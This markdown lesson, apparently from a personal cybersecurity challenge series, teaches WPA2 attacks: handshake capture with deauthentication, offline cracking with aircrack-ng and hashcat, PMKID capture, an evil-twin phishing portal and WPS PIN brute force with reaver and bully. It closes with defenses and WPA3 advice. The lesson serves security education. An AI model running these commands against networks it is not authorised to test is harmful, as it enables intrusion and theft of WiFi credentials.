# Day 038 - Wireless Security: WPA2 Attacks & Defenses

> **Challenge:** 100 Days of Cybersecurity | **Phase:** Offensive Security | **Difficulty:** Intermediate

---

## 🧠 The Concept

WiFi is the most common network people assume is secure just because it has a password.

It isn't. WPA2 - the standard used by almost every home and business network - is vulnerable to offline brute force attacks. The handshake that occurs when a device connects can be captured. That captured handshake can be cracked offline, at 10+ million attempts per second.

Today: how WPA2 authentication works, how it gets attacked, and how to actually secure a wireless network.

> ⚠️ Only test against networks you own or have explicit written permission to test. Unauthorized wireless interception is illegal in most jurisdictions.

---

## 📡 How WPA2 Authentication Works

```
Client                    Access Point (AP)
   |                           |
   | ── Association Request ──▶|
   |◀── Association Response──|
   |                           |
   | ── EAPOL Message 1 ──────▶| ANonce (AP random)
   |◀── EAPOL Message 2 ──────| SNonce (Client random) + MIC
   |                           |
   Both sides derive PTK (Pairwise Transient Key) from:
   PMK + ANonce + SNonce + MAC addresses
   PMK = PBKDF2(password, SSID, 4096, 256)
   |                           |
   | ── EAPOL Message 3 ──────▶|
   |◀── EAPOL Message 4 ──────|
```

**The attack:** Capture messages 1-4 (the 4-way handshake). This gives you enough to verify password guesses offline - without ever connecting to the network.

---

## 🔧 Required Tools (all pre-installed on Kali)

```
aircrack-ng suite:
  airmon-ng   → put adapter in monitor mode
  airodump-ng → capture packets
  aireplay-ng → inject packets (deauth)
  aircrack-ng → crack captured handshake

hashcat       → faster GPU-based cracking
hcxdumptool  → modern PMKID capture (no deauth needed)
hcxtools      → convert capture formats
```

**WiFi adapter requirement:** Needs to support monitor mode and packet injection. Built-in adapters usually don't. Common options: Alfa AWUS036ACH, TP-Link TL-WN722N.

---

## 🎯 Attack 1 - WPA2 Handshake Capture + Crack

### Step 1: Enable Monitor Mode

```bash
# List wireless interfaces
iwconfig

# Kill processes that interfere
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0
# Creates: wlan0mon

# Verify
iwconfig wlan0mon
# Mode: Monitor
```

### Step 2: Scan for Networks

```bash
sudo airodump-ng wlan0mon

# Output:
# BSSID              PWR  Beacons  #Data  CH  MB  ENC  ESSID
# AA:BB:CC:DD:EE:FF  -65      23      5   6  54  WPA2 TargetNetwork
```

Note the BSSID (AP MAC) and channel of your target.

### Step 3: Capture Handshake

```bash
# Target specific network
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# -c 6        = channel 6
# --bssid     = target AP MAC
# -w capture  = save to capture.cap

# Wait for a device to connect naturally
# OR force reconnection via deauthentication:
```

### Step 4: Deauthentication Attack (Force Handshake)

```bash
# In a second terminal - send deauth frames to kick a client off
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
# --deauth 10    = send 10 deauth packets (enough to force reconnect)
# -a             = target AP BSSID

# Client reconnects → airodump-ng captures the handshake
# Look for: WPA handshake: AA:BB:CC:DD:EE:FF in airodump output
```

### Step 5: Crack the Handshake

```bash
# aircrack-ng (CPU)
aircrack-ng capture.cap -w /usr/share/wordlists/rockyou.txt

# hashcat (GPU - much faster)
# Convert cap to hc22000 format first
hcxpcapngtool -o hash.hc22000 capture.cap

# Crack with hashcat
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
hashcat -m 22000 hash.hc22000 rockyou.txt -r best64.rule
```

---

## 🎯 Attack 2 - PMKID Attack (No Client Needed)

Newer attack - doesn't require waiting for a client to connect.

```bash
# Capture PMKID directly from AP beacon
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# Wait 30-60 seconds → stop with Ctrl+C

# Convert to hashcat format
hcxpcapngtool -o hash.hc22000 pmkid.pcapng

# Crack
hashcat -m 22000 hash.hc22000 rockyou.txt -r best64.rule
```

The PMKID is derived from the PMK (which is derived from the password) - cracking it reveals the password without needing a connecting client.

---

## 🎯 Attack 3 - Evil Twin / Rogue AP

```
1. Create a fake AP with same SSID as target
2. Deauthenticate clients from the real AP
3. Clients connect to your fake AP
4. Serve a captive portal asking for WiFi password
5. Capture credentials directly

Tools: hostapd-wpe, wifiphisher
```

This doesn't require cracking - the user hands you the password directly.

---

## 🎯 Attack 4 - WPS PIN Attack

WPS (WiFi Protected Setup) has a design flaw - the 8-digit PIN is verified in two halves separately, reducing the search space from 10^8 to 10^4 + 10^3 = 11,000 combinations.

```bash
# Check if WPS is enabled (and unlocked)
sudo wash -i wlan0mon

# Brute force WPS PIN
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -v
# Takes minutes to hours depending on AP lockout policy
# Returns WPA2 password directly when PIN found

# Faster alternative
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -v 3
```

Many modern routers have WPS disabled or have lockout after failed attempts. But many don't.

---

## 🛡️ Defenses

| Attack | Defense |
|--------|---------|
| Handshake capture + crack | Use a long, random WiFi password (20+ chars) |
| Dictionary attack | Avoid real words, names, dates in password |
| PMKID attack | Same - strong password is the only defense |
| WPS attack | Disable WPS completely on the router |
| Evil Twin | WPA3 provides better protection; user awareness |
| Rogue AP | Use VPN on untrusted networks |

**Password strength matters enormously:**

```
"password123"        → cracks in seconds
"Summer2024!"        → cracks in minutes with rules
"MyDogIsFluffy"      → cracks in hours (wordlist + rules)
"Xk9#mP2qRv5@nL8"   → effectively uncrackable with current tools
```

A 20-character random password makes dictionary attacks completely impractical.

**WPA3** (the successor to WPA2) uses Simultaneous Authentication of Equals (SAE) which is resistant to offline dictionary attacks - even if the handshake is captured. Enable it if your router supports it.

---

## 🔑 Key Takeaways

- WPA2 handshake can be captured passively - cracked offline with no time limit
- Deauth attack forces reconnection to capture handshake faster
- PMKID attack works without any connected clients
- Password strength is the only real defence against offline cracking
- Disable WPS - it has a fundamental design flaw
- WPA3 provides genuine protection against offline attacks

---

## 📚 Resources
- [Aircrack-ng documentation](https://www.aircrack-ng.org/documentation.html)
- [TryHackMe - Wifi Hacking 101 (free)](https://tryhackme.com/room/wifihacking101)
- [Router Security - RouterSecurity.org](https://www.routersecurity.org/)

---

## [⬅️ Day 037](../day037/) | [➡️ Day 039](../day039/)

*Part of my [100 Days of Cybersecurity](../README.md) challenge.*